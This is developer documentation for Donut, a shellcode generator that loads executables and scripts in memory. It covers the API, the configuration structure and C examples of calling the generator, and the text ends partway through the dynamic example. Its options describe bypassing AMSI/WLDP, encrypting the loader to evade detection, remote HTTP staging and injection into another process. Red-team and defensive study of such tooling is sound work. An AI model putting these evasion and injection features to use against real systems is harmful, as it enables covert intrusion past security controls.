
<html>
  <head>
    <meta charset="utf-8">
  </head>
  <body>

<h2>Table of contents</h2>

<ol>
  <li><a href="#intro">Introduction</a></li>
  <li><a href="#api">Donut API</a></li>
  <li><a href="#config">Donut Configuration</a></li>
  <li><a href="#static">Static Example</a></li>
  <li><a href="#dynamic">Dynamic Example</a></li>
  <li><a href="#com">Donut Components</a></li>
  <li><a href="#instance">Donut Instance</a></li>
  <li><a href="#module">Donut Module</a></li>
  <li><a href="#hashing">Win32 API Hashing</a></li>
  <li><a href="#encryption">Symmetric Encryption</a></li>
  <li><a href="#bypass">Bypasses for AMSI/WLDP</a></li>
  <li><a href="#debug">Debugging The Generator and Loader</a></li>
  <li><a href="#loader">Extending The Loader</a></li>
</ol>

<h2 id="intro">1. Introduction</h2>

<p>This document contains information useful to developers that want to integrate Donut into their own project or write their own generator in a different language. Static and dynamic examples in C are provided for Windows and Linux. There's also information about the internals of the generator and loader such as data structures, the hash algorithm for resolving API, how bypassing AMSI and WLDP works, the symmetric encryption, debugging the generator and loader. Finally, there's also some information on how to extend functionality of the loader itself.</p>

<h2 id="api">2. Donut API</h2>

<p>Shared/dynamic and static libraries for both Windows and Linux provide access to three API.</p>

<ol>

  <li><code>int DonutCreate(PDONUT_CONFIG)</code></li>
  <p>Builds the Donut shellcode/loader using settings stored in a <code>DONUT_CONFIG</code> structure.</p>
  
  <li><code>int DonutDelete(PDONUT_CONFIG)</code></li>
  <p>Releases any resources allocated by a successful call to <code>DonutCreate</code>.</p>
  
  <li><code>const char* DonutError(int error)</code></li>
  <p>Returns a description for an error code returned by <code>DonutCreate</code>.</p>

</ol>

<p>The Donut project already contains a generator in C. <a href="https://twitter.com/nixbyte">nixbyte</a> has written <a href="https://github.com/n1xbyte/donutCS">a generator in C#</a>. awgh has written <a href="https://github.com/Binject/go-donut/">a generator in Go</a> and <a href="https://twitter.com/byt3bl33d3r">byt3bl33d3r</a> has written a Python module already included with the source.</p>

<h2 id="config">3. Donut Configuration</h2>

<p>The minimum configuration required to build the loader is a path to a VBS/JS/EXE/DLL file that will be executed in-memory. If the file is a .NET DLL, a class and method are required. If the module will be stored on a HTTP server, a URL is required. The following structure is declared in donut.h and should be zero initialized prior to setting any member.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> _DONUT_CONFIG <span style='color:#800080; '>{</span>
    uint32_t        len<span style='color:#808030; '>,</span> zlen<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// original length of input file and compressed length</span>
    <span style='color:#696969; '>// general / misc options for loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             arch<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// target architecture</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             bypass<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// bypass option for AMSI/WDLP</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             compress<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// engine to use when compressing file via RtlCompressBuffer</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             entropy<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// entropy/encryption level</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             format<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// output format for loader</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             exit_opt<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// return to caller or invoke RtlExitUserProcess to terminate the host process</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             thread<span style='color:#800080; '>;</span>                   <span style='color:#696969; '>// run entrypoint of unmanaged EXE as a thread. attempts to intercept calls to exit-related API</span>
    uint64_t        oep<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// original entrypoint of target host file</span>
    
    <span style='color:#696969; '>// files in/out</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            input<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// name of input file to read and load in-memory</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            output<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of output file to save loader</span>
    
    <span style='color:#696969; '>// .NET stuff</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            runtime<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// runtime version to use for CLR</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            domain<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of domain to create for .NET DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            cls<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>      <span style='color:#696969; '>// name of class with optional namespace for .NET DLL</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            method<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// name of method or DLL function to invoke for .NET DLL and unmanaged DLL</span>
    
    <span style='color:#696969; '>// command line for DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            param<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>    <span style='color:#696969; '>// command line to use for unmanaged DLL/EXE and .NET DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             unicode<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// param is passed to DLL function without converting to unicode</span>
    
    <span style='color:#696969; '>// HTTP/DNS staging information</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            server<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>   <span style='color:#696969; '>// points to root path of where module will be stored on remote HTTP server or DNS server</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            modname<span style='color:#808030; '>[</span>DONUT_MAX_NAME<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>  <span style='color:#696969; '>// name of module written to disk for http stager</span>
    
    <span style='color:#696969; '>// DONUT_MODULE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_type<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// VBS/JS/DLL/EXE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             mod_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of DONUT_MODULE</span>
    DONUT_MODULE    <span style='color:#808030; '>*</span>mod<span style='color:#800080; '>;</span>                     <span style='color:#696969; '>// points to DONUT_MODULE</span>
    
    <span style='color:#696969; '>// DONUT_INSTANCE</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_type<span style='color:#800080; '>;</span>                <span style='color:#696969; '>// DONUT_INSTANCE_EMBED or DONUT_INSTANCE_HTTP</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             inst_len<span style='color:#800080; '>;</span>                 <span style='color:#696969; '>// size of DONUT_INSTANCE</span>
    DONUT_INSTANCE  <span style='color:#808030; '>*</span>inst<span style='color:#800080; '>;</span>                    <span style='color:#696969; '>// points to DONUT_INSTANCE</span>
    
    <span style='color:#696969; '>// shellcode generated from configuration</span>
    <span style='color:#800000; font-weight:bold; '>int</span>             pic_len<span style='color:#800080; '>;</span>                  <span style='color:#696969; '>// size of loader/shellcode</span>
    <span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span>           pic<span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// points to loader/shellcode</span>
<span style='color:#800080; '>}</span> DONUT_CONFIG<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_CONFIG<span style='color:#800080; '>;</span>
</pre>

<p>The following table provides a description of each member.</p>

<table border="1">
  <tr>
    <th>Member</th>
    <th>Description</th>
  </tr>
  <tr>
    <td><code>len, zlen</code></td>
    <td><var>len</var> holds the length of the file to execute in-memory. If compression is used, <var>zlen</var> will hold the length of file compressed.</td>
  </tr>
  <tr>
    <td><code>arch</code></td>
    <td>Indicates the type of assembly code to generate. <code>DONUT_ARCH_X86</code> and <code>DONUT_ARCH_X64</code> are self-explanatory. <code>DONUT_ARCH_X84</code> indicates dual-mode that combines shellcode for both X86 and AMD64. ARM64 will be supported at some point.</td>
  </tr>
  <tr>
    <td><code>bypass</code></td>
    <td>Specifies behaviour of the code responsible for bypassing AMSI and WLDP. The current options are <code>DONUT_BYPASS_NONE</code> which indicates that no attempt be made to disable AMSI or WLDP. <code>DONUT_BYPASS_ABORT</code> indicates that failure to disable should result in aborting execution of the module. <code>DONUT_BYPASS_CONTINUE</code> indicates that even if AMSI/WDLP bypasses fail, the shellcode will continue with execution.</td>
  </tr>
  <tr>
    <td><code>compress</code></td>
    <td>Indicates if the input file should be compressed. Available engines are <code>DONUT_COMPRESS_APLIB</code> to use the <a href="http://ibsensoftware.com/products_aPLib.html">aPLib</a> algorithm. For builds on Windows, the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcompressbuffer">RtlCompressBuffer</a> API is available and supports <code>DONUT_COMPRESS_LZNT1</code>, <code>DONUT_COMPRESS_XPRESS</code> and <code>DONUT_COMPRESS_XPRESS_HUFF</code>.</td>
  </tr>
  <tr>
    <td><code>entropy</code></td>
    <td>Indicates whether Donut should use entropy and/or encryption for the loader to help evade detection. Available options are <code>DONUT_ENTROPY_NONE</code>, <code>DONUT_ENTROPY_RANDOM</code>, which generates random strings and <code>DONUT_ENTROPY_DEFAULT</code> that combines <code>DONUT_ENTROPY_RANDOM</code> with symmetric encryption.</td>
  </tr>
  <tr>
    <td><code>format</code></td>
    <td>Specifies the output format for the shellcode loader. Supported formats are <code>DONUT_FORMAT_BINARY</code>, <code>DONUT_FORMAT_BASE64</code>, <code>DONUT_FORMAT_RUBY</code>, <code>DONUT_FORMAT_C</code>, <code>DONUT_FORMAT_PYTHON</code>, <code>DONUT_FORMAT_POWERSHELL</code>, <code>DONUT_FORMAT_CSHARP</code> and <code>DONUT_FORMAT_HEX</code>. On Windows, the base64 string is copied to the clipboard.</td>
  </tr>
  <tr>
    <td><code>exit_opt</code></td>
    <td>When the shellcode ends, <code>RtlExitUserThread</code> is called, which is the default behaviour. Set this to <code>DONUT_OPT_EXIT_PROCESS</code> to terminate the host process via the <code>RtlExitUserProcess</code> API.</td>
  </tr>
  <tr>
    <td><code>thread</code></td>
    <td>If the file is an unmanaged EXE, the loader will run the entrypoint as a thread. The loader also attempts to intercept calls to exit-related API stored in the Import Address Table by replacing those pointers with the address of the <code>RtlExitUserThread</code> API. However, hooking via IAT is generally unreliable and Donut may use code splicing / hooking in the future.</td>
  </tr>
  <tr>
    <td><code>oep</code></td>
    <td>Tells the loader to create a new thread before continuing execution at the OEP provided by the user. Address should be in hexadecimal format.</td>
  </tr>
  
  <tr>
    <td><code>input</code></td>
    <td>The path of file to execute in-memory. VBS/JS/EXE/DLL files are supported.</td>
  </tr>
  <tr>
    <td><code>output</code></td>
    <td>The path of where to save the shellcode/loader. Default is "loader.bin".</td>
  </tr>
  
  <tr>
    <td><code>runtime</code></td>
    <td>The CLR runtime version to use for a .NET assembly. If none is provided, Donut will try reading from the PE's COM directory. If that fails, v4.0.30319 is used by default.</td>
  </tr>
  <tr>
    <td><code>domain</code></td>
    <td>AppDomain name to create. If one is not specified by the caller, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
  <tr>
    <td><code>cls</code></td>
    <td>The class name with method to invoke. A namespace is optional. e.g: <var>namespace.class</var></td>
  </tr>
  <tr>
    <td><code>method</code></td>
    <td>The method that will be invoked by the shellcode once a .NET assembly is loaded into memory. This also holds the name of an exported API if the module is an unmanaged DLL.</td>
  </tr>
  
  <tr>
    <td><code>param</code></td>
    <td>String with a list of parameters for the .NET method or DLL function. For unmanaged EXE files, a 4-byte string is generated randomly to act as the module name. If entropy is disabled, this will be "AAAA"</td>
  </tr>
  <tr>
    <td><code>unicode</code></td>
    <td>By default, the <code>param</code> string is passed to an unmanaged DLL function as-is, in ANSI format. If set, param is converted to UNICODE.</td>
  </tr>
  
  <tr>
    <td><code>server</code></td>
    <td>If the instance <code>type</code> is <code>DONUT_INSTANCE_HTTP</code>, this should contain the server and path of where module will be stored. e.g: https://www.staging-server.com/modules/</td>
  </tr>

  <tr>
    <td><code>modname</code></td>
    <td>If the <code>type</code> is <code>DONUT_INSTANCE_HTTP</code>, this will contain the name of the module for where to save the contents of <code>mod</code> to disk. If none is provided by the user, it will be generated randomly. If entropy is disabled, it will be set to "AAAAAAAA"</td>
  </tr>
  <tr>
    <td><code>mod_type</code></td>
    <td>Indicates the type of file detected by <code>DonutCreate</code>. For example, <code>DONUT_MODULE_VBS</code> indicates a VBScript file.</td>
  </tr>
  <tr>
    <td><code>mod_len</code></td>
    <td>The total size of the <var>Module</var> pointed to by <code>mod</code>.</td>
  </tr>
  <tr>
    <td><code>mod</code></td>
    <td>Points to encrypted <var>Module</var>. If the <code>type</code> is <code>DONUT_INSTANCE_HTTP</code>, this should be saved to file using the <code>modname</code> and accessible via HTTP server.</td>
  </tr>
  
  <tr>
    <td><code>inst_type</code></td>
    <td><code>DONUT_INSTANCE_EMBED</code> indicates a self-contained payload which means the file is embedded. <code>DONUT_INSTANCE_HTTP</code> indicates the file is stored on a remote HTTP server.</td>
  </tr>
  <tr>
    <td><code>inst_len</code></td>
    <td>The total size of the <var>Instance</var> pointed to by <code>inst</code>.</td>
  </tr>
  <tr>
    <td><code>inst</code></td>
    <td>Points to an encrypted <var>Instance</var> after a successful call to <code>DonutCreate</code>. Since it's already attached to the <code>pic</code>, this is only provided for debugging purposes.</td>
  </tr>
  
  <tr>
    <td><code>pic_len</code></td>
    <td>The size of data pointed to by <code>pic</code>.</td>
  </tr>
  <tr>
    <td><code>pic</code></td>
    <td>Points to the loader/shellcode. This should be injected into a remote process.</td>
  </tr>
</table>

<h2 id="static">4. Static Example</h2>

<p>The following is linked with the static library donut.lib on Windows or donut.a on Linux.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#004a43; '>#</span><span style='color:#004a43; '>include </span><span style='color:#800000; '>"</span><span style='color:#40015a; '>donut.h</span><span style='color:#800000; '>"</span>

<span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#400000; '>main</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>int</span> argc<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>argv<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    DONUT_CONFIG c<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>          err<span style='color:#800080; '>;</span>
    <span style='color:#603000; '>FILE</span>         <span style='color:#808030; '>*</span>out<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// need at least a file</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>argc <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>2</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ usage: donut_static &lt;EXE></span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    
    <span style='color:#603000; '>memset</span><span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// copy input file</span>
    <span style='color:#400000; '>lstrcpyn</span><span style='color:#808030; '>(</span>c<span style='color:#808030; '>.</span>input<span style='color:#808030; '>,</span> argv<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> DONUT_MAX_NAME<span style='color:#808030; '>-</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// default settings</span>
    c<span style='color:#808030; '>.</span>inst_type <span style='color:#808030; '>=</span> DONUT_INSTANCE_EMBED<span style='color:#800080; '>;</span>   <span style='color:#696969; '>// file is embedded</span>
    c<span style='color:#808030; '>.</span>arch      <span style='color:#808030; '>=</span> DONUT_ARCH_X84<span style='color:#800080; '>;</span>         <span style='color:#696969; '>// dual-mode (x86+amd64)</span>
    c<span style='color:#808030; '>.</span>bypass    <span style='color:#808030; '>=</span> DONUT_BYPASS_CONTINUE<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// continues loading even if disabling AMSI/WLDP fails</span>
    c<span style='color:#808030; '>.</span>format    <span style='color:#808030; '>=</span> DONUT_FORMAT_BINARY<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// default output format</span>
    c<span style='color:#808030; '>.</span>compress  <span style='color:#808030; '>=</span> DONUT_COMPRESS_NONE<span style='color:#800080; '>;</span>    <span style='color:#696969; '>// compression is disabled by default</span>
    c<span style='color:#808030; '>.</span>entropy   <span style='color:#808030; '>=</span> DONUT_ENTROPY_DEFAULT<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// enable random names + symmetric encryption by default</span>
    c<span style='color:#808030; '>.</span>exit_opt  <span style='color:#808030; '>=</span> DONUT_OPT_EXIT_THREAD<span style='color:#800080; '>;</span>  <span style='color:#696969; '>// default behaviour is to exit the thread</span>
    c<span style='color:#808030; '>.</span>thread    <span style='color:#808030; '>=</span> <span style='color:#008c00; '>1</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// run entrypoint as a thread</span>
    c<span style='color:#808030; '>.</span>unicode   <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>                      <span style='color:#696969; '>// command line will not be converted to unicode for unmanaged DLL function</span>
    
    <span style='color:#696969; '>// generate the shellcode</span>
    err <span style='color:#808030; '>=</span> DonutCreate<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>err <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> DONUT_ERROR_SUCCESS<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Error : </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> DonutError<span style='color:#808030; '>(</span>err<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> 
    
    <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ loader saved to </span><span style='color:#007997; '>%s</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> c<span style='color:#808030; '>.</span>output<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    DonutDelete<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>c<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h2 id="dynamic">5. Dynamic Example</h2>

<p>This example requires access to donut.dll on Windows or donut.so on Linux.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#004a43; '>#</span><span style='color:#004a43; '>include </span><span style='color:#800000; '>"</span><span style='color:#40015a; '>donut.h</span><span style='color:#800000; '>"</span>

<span style='color:#800000; font-weight:bold; '>int</span> <span style='color:#400000; '>main</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>int</span> argc<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>argv<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    DONUT_CONFIG  c<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>           err<span style='color:#800080; '>;</span>

    <span style='color:#696969; '>// function pointers</span>
    DonutCreate_t _DonutCreate<span style='color:#800080; '>;</span>
    DonutDelete_t _DonutDelete<span style='color:#800080; '>;</span>
    DonutError_t  _DonutError<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// need at least a file</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>argc <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>2</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ usage: donut_dynamic &lt;file></span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    
    <span style='color:#696969; '>// try load donut.dll or donut.so</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>if</span><span style='color:#004a43; '> </span><span style='color:#004a43; '>defined</span><span style='color:#808030; '>(</span><span style='color:#004a43; '>WINDOWS</span><span style='color:#808030; '>)</span>
      <span style='color:#603000; '>HMODULE</span> m <span style='color:#808030; '>=</span> <span style='color:#400000; '>LoadLibrary</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>donut.dll</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>m <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        _DonutCreate <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutCreate_t<span style='color:#808030; '>)</span><span style='color:#400000; '>GetProcAddress</span><span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutCreate</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutDelete <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutDelete_t<span style='color:#808030; '>)</span><span style='color:#400000; '>GetProcAddress</span><span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutDelete</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutError  <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutError_t<span style='color:#808030; '>)</span> <span style='color:#400000; '>GetProcAddress</span><span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutError</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_DonutCreate <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutDelete <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutError <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to resolve Donut API.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
          <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800080; '>{</span>
        <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to load donut.dll.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>else</span>
      <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>m <span style='color:#808030; '>=</span> dlopen<span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>donut.so</span><span style='color:#800000; '>"</span><span style='color:#808030; '>,</span> RTLD_LAZY<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>m <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        _DonutCreate <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutCreate_t<span style='color:#808030; '>)</span>dlsym<span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutCreate</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutDelete <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutDelete_t<span style='color:#808030; '>)</span>dlsym<span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutDelete</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        _DonutError  <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>DonutError_t<span style='color:#808030; '>)</span> dlsym<span style='color:#808030; '>(</span>m<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>DonutError</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_DonutCreate <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutDelete <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> _DonutError <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to resolve Donut API.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
          <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800080; '>{</span>
        <span style='color:#603000; '>printf</span><span style='color:#808030; '>(</span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>  [ Unable to load donut.so.</span><span style='color:#0f69ff; '>\n</span><span style='color:#800000; '>"</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
<span style='color:#004a43; '>&#xa0;&#xa0;&#xa0;&#xa0;</span><span style='color:#004a43; '>#</span><span style='color:#004a43; '>endif</span>
  
